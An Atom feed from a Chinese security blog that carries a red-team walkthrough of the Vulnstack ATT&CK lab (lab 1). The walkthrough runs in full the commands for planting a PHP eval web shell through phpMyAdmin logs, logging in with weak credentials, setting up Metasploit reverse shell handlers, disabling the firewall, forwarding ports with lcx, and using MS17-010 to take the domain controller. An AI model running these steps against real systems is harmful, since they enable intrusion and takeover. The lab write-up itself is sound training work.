<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hdys0vn&#39;s Blog</title>
  
  <subtitle>向着光亮那方</subtitle>
  <link href="https://hdys0vn.github.io/atom.xml" rel="self"/>
  
  <link href="https://hdys0vn.github.io/"/>
  <updated>2022-02-15T12:02:43.615Z</updated>
  <id>https://hdys0vn.github.io/</id>
  
  <author>
    <name>Hdys0vn</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="https://hdys0vn.github.io/2022/02/15/hello-world/"/>
    <id>https://hdys0vn.github.io/2022/02/15/hello-world/</id>
    <published>2022-02-15T07:09:45.235Z</published>
    <updated>2022-02-15T12:02:43.615Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">May be a hack！！！<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulnstack红队评估实战靶场系列一</title>
    <link href="https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/"/>
    <id>https://hdys0vn.github.io/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/</id>
    <published>2021-10-16T00:14:03.000Z</published>
    <updated>2022-03-20T02:16:06.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）"><a href="#ATT-amp-CK红队评估实战靶场（一）" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一）"></a>ATT&amp;CK红队评估实战靶场（一）</h1><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>一直想要学习内网知识，看了很多文章，感觉还是眼高手低，打整个靶场还是不太顺利，自己很多知识点还是有点模糊，不说了菜鸡十号菜啊！！！</p><p>本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&amp;CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。</p><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316081903337.png"></p><h2 id="0x03-漏洞发现及利用"><a href="#0x03-漏洞发现及利用" class="headerlink" title="0x03 漏洞发现及利用"></a>0x03 漏洞发现及利用</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1. 信息收集"></a>3.1. 信息收集</h3><h4 id="3-1-1-主机探测"><a href="#3-1-1-主机探测" class="headerlink" title="3.1.1 主机探测"></a>3.1.1 主机探测</h4><pre class="line-numbers language-none"><code class="language-none">netdiscover -i eth0 -r 192.168.1.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083407043.png"></p><h4 id="3-1-2-端口扫描"><a href="#3-1-2-端口扫描" class="headerlink" title="3.1.2 端口扫描"></a>3.1.2 端口扫描</h4><p>​    发现IP192.168.1.102，使用nmap探测其端口开放情况</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083633458.png"></p><p>​    发现80端口开启，访问页面<code>http://192.168.1.103/</code>发现页面如下，存在大量信息泄露，收集有效信息</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316083750415.png"></p><h4 id="3-1-3-目录扫描"><a href="#3-1-3-目录扫描" class="headerlink" title="3.1.3 目录扫描"></a>3.1.3 目录扫描</h4><p>​    使用使用御剑目录扫描专业版进行目录扫描(网站目录扫描的全面及准确性与字典有关，良好的字典能够发现别人发现不了的目录)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316085429546.png"></p><p>​    发现网站备份文件和phpadmin后台管理界面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090035081.png"></p><p>​    打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.3/yxcms</code>进入网站首页</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090223570.png"></p><h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2. 漏洞利用"></a>3.2. 漏洞利用</h3><h4 id="3-2-1-漏洞发现"><a href="#3-2-1-漏洞发现" class="headerlink" title="3.2.1 漏洞发现"></a>3.2.1 漏洞发现</h4><h5 id="3-2-1-1-漏洞一：信息泄露-弱口令"><a href="#3-2-1-1-漏洞一：信息泄露-弱口令" class="headerlink" title="3.2.1.1 漏洞一：信息泄露+弱口令"></a>3.2.1.1 漏洞一：信息泄露+弱口令</h5><p>​    网站泄露后台地址和用户密码，且用户密码为弱口令</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090332375.png"></p><p>​    成功登陆网站后台</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090504559.png"></p><h5 id="3-2-1-2-漏洞二：PhpMyAdmin弱口令"><a href="#3-2-1-2-漏洞二：PhpMyAdmin弱口令" class="headerlink" title="3.2.1.2 漏洞二：PhpMyAdmin弱口令"></a>3.2.1.2 漏洞二：PhpMyAdmin弱口令</h5><p>​    发现使用默认用户名&#x2F;口令（root&#x2F;root）成功登录PhpMyAdmin管理页面</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316090650585.png"></p><h5 id="3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞"><a href="#3-2-1-3-漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞"></a>3.2.1.3 漏洞三：yxcms留言本XSS存储型漏洞</h5><p>​    前台提交带有XSS代码的留言</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091444360.png"></p><p>​    后台审核时成功弹出xss窗口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091557461.png"></p><p>​    审核通过后在网站留言板部分也会弹出xss弹窗</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316091847996.png"></p><p>​    可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码</p><h5 id="3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞"><a href="#3-2-1-4-漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞"></a>3.2.1.4 漏洞四：yxcms后台任意文件读写漏洞</h5><p>​    在后台创建新模板模块创建内容为一句话的新模板</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316111906759.png"></p><p>通过前面的备份文件可知文件保存的目录</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.3&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100450964-1245106639.png"></p><p>​    使用蚁剑成功连接shell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112139929.png"></p><h5 id="3-2-1-5-漏洞五：yxcms后台SQL注入漏洞"><a href="#3-2-1-5-漏洞五：yxcms后台SQL注入漏洞" class="headerlink" title="3.2.1.5 漏洞五：yxcms后台SQL注入漏洞"></a>3.2.1.5 漏洞五：yxcms后台SQL注入漏洞</h5><p>​    在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。</p><p>yxcms漏洞代码原理解析参考文章<a href="https://www.freebuf.com/column/162886.html">https://www.freebuf.com/column/162886.html</a></p><h5 id="3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell"><a href="#3-2-1-6-漏洞六：PhpMyAdmin开启全局日志getshell" class="headerlink" title="3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell"></a>3.2.1.6 漏洞六：PhpMyAdmin开启全局日志getshell</h5><p>​    前面我们已经登陆到phpmyadmin，那么我们首先可以测试一下是否可以使用select into outfile直接写入</p><pre class="line-numbers language-none"><code class="language-none">Select &#39;&lt;?php eval($_POST[hack]);?&gt; &#39; into outfile &#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316112634592.png"></p><p>写入失败， </p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%secure%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看变量secure-file-priv 值为NULL，且为只读无法修改。</p><p>尝试使用全局日志写入shell，查看全局变量general_log：</p><pre class="line-numbers language-none"><code class="language-none">SHOW GLOBAL VARIABLES LIKE &#39;%general_%&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113228177.png"></p><p>开启全局日志并修改日志保存位置为C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php</p><pre class="line-numbers language-none"><code class="language-none">set global general_log&#x3D;on;set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;hack.php&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113435571.png"></p><p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113553829.png"></p><p>使用蚁剑连接一句话木马<code>http://192.168.1.3/hack.php</code></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316113709282.png"></p><h3 id="3-3-CS上线GetShell"><a href="#3-3-CS上线GetShell" class="headerlink" title="3.3 CS上线GetShell"></a>3.3 CS上线GetShell</h3><p>CS客户端服务端都部署在192.168.1.5主机上，创建监听并生成powershell</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316115646878.png"></p><p>提权成功</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120020075.png"></p><h3 id="3-4-系统信息收集"><a href="#3-4-系统信息收集" class="headerlink" title="3.4 系统信息收集"></a>3.4 系统信息收集</h3><p>查看网卡</p><pre class="line-numbers language-none"><code class="language-none">shell ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316125752478.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316120358179.png"></p><p>发现内网ip地址192.168.52.143和域god.org，查看域信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>net group “domain computers” /domain <span class="token comment">#查看域成员计算机列表</span>net group “domain admins” /domain <span class="token comment">#查看域管理员用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100603667-966546984.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/1605154-20200928100608263-1817479356.png"></p><p>本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA</p><h3 id="3-5-主机密码收集"><a href="#3-5-主机密码收集" class="headerlink" title="3.5 主机密码收集"></a>3.5 主机密码收集</h3><p>获取系统用户名和密码</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121241458.png"></p><h3 id="3-6-远程桌面登录"><a href="#3-6-远程桌面登录" class="headerlink" title="3.6 远程桌面登录"></a>3.6 远程桌面登录</h3><p>远程开启3389端口并关闭防火墙</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">注册表开启3389端口REG ADD HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f关闭防火墙netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment">#winsows server 2003 之前</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off <span class="token comment">#winsows server 2003 之后</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121449483.png"></p><p>这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator&#x2F;hongrisec@2020成功登录这一台win7WEB主机</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220316121709477.png"></p><h2 id="0x04-攻入内网及横向移动"><a href="#0x04-攻入内网及横向移动" class="headerlink" title="0x04 攻入内网及横向移动"></a>0x04 攻入内网及横向移动</h2><p>注意：这里已经在cs端进行了提权</p><h3 id="4-1-将cs会话派生给msf"><a href="#4-1-将cs会话派生给msf" class="headerlink" title="4.1 将cs会话派生给msf"></a>4.1 将cs会话派生给msf</h3><p>打开MSF，开始监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.1.5set lport 8888exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318163608922.png"></p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318170258970.png"></p><h3 id="4-2-内网–继续信息收集"><a href="#4-2-内网–继续信息收集" class="headerlink" title="4.2 内网–继续信息收集"></a>4.2 内网–继续信息收集</h3><h4 id="4-2-1-补丁信息"><a href="#4-2-1-补丁信息" class="headerlink" title="4.2.1 补丁信息"></a>4.2.1 补丁信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173346684.png"></p><h4 id="4-2-2-软件安装信息"><a href="#4-2-2-软件安装信息" class="headerlink" title="4.2.2 软件安装信息"></a>4.2.2 软件安装信息</h4><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173500987.png"></p><h4 id="4-2-3-路由信息并添加路由"><a href="#4-2-3-路由信息并添加路由" class="headerlink" title="4.2.3 路由信息并添加路由"></a>4.2.3 路由信息并添加路由</h4><p>添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0&#x2F;24网段</p><pre class="line-numbers language-none"><code class="language-none">#查看路由信息run get_local_subnets#添加一条路由run autoroute -s 192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318173738839.png"></p><p>使用msf的socks4代理模块</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318164436351.png"></p><p>文本编辑器修改<code>etc/proxychains.conf</code>，在最后一行加上socks4代理服务器</p><pre class="line-numbers language-none"><code class="language-none">[ProxyList]socks4 192.168.1.5 1080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后我们就可以使用proxychains代理nmap扫描主机</p><h4 id="4-2-4-arp扫描内网主机"><a href="#4-2-4-arp扫描内网主机" class="headerlink" title="4.2.4 arp扫描内网主机"></a>4.2.4 arp扫描内网主机</h4><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.52.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318174314595.png"></p><h4 id="4-2-5-内网扫描"><a href="#4-2-5-内网扫描" class="headerlink" title="4.2.5 内网扫描"></a>4.2.5 内网扫描</h4><p>扫描域控开放的端口及存在的相应漏洞</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -sV -Pn -p22,80,443,135,445 --script&#x3D;vuln 192.168.52.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184046567.png"></p><p>挂代理访问域控的80端口</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220318184117657.png"></p><p>现在我们需要认识到，直接使用proxychains使msf走代理攻击到192.168.52.138，是无法获得meterpreter会话，因此下一步使用lcx进行端口转发接收meterpreter</p><p>win7使用lcx转发</p><p>上传lcx到win7，执行命令对55555进行监听：lcx -tran 55555 192.168.1.12 12345</p><p>(命令解释：通过lcx监听本地5555端口，收到数据后转发到192.168.1.12的12345端口，因此kali需要设置监听12345来接收shell)</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094743824.png"></p><p>msf监听12345端口：<br>kali启动终端，输入：msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.5set lport 12345run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320094822558.png"></p><p>proxychains代理msf对域控（192.168.52.138）进行ms17-010攻击</p><p>kali启动终端，输入：proxychains msfconsole启动msf</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;smb&#x2F;ms17_010_psexecset rhosts 192.168.52.138set lhost 192.168.52.143set lport 55555run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击完成kali成功获取到会话</p><p><img src="/2021/10/16/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%E4%B8%80/image-20220320095044892.png"></p><p>至此成功获取到域控</p><p>对于域成员192.168.52.141 我们同样可以使用这种攻击方式，这里就不在演示</p><h3 id="0x05-说明："><a href="#0x05-说明：" class="headerlink" title="0x05 说明："></a>0x05 说明：</h3><p>经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，也参考了网络上的一些师傅们的教程，感谢分享。</p><p>​    需要说明的是，获取域控的方式有很多，这里我们是直接利用了主机本身存在的安全漏洞。对于攻击成功以后的痕迹清理等等，都没有涉及到，不足的地方再查漏补缺，后续的系列文章中，我们再不断的学习不同的利用方式。</p><p>到此最简单的获取域控线路结束</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ATT-amp-CK红队评估实战靶场（一）&quot;&gt;&lt;a href=&quot;#ATT-amp-CK红队评估实战靶场（一）&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK红队评估实战靶场（一）&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK红队评估实战靶场（一）&lt;/</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://hdys0vn.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
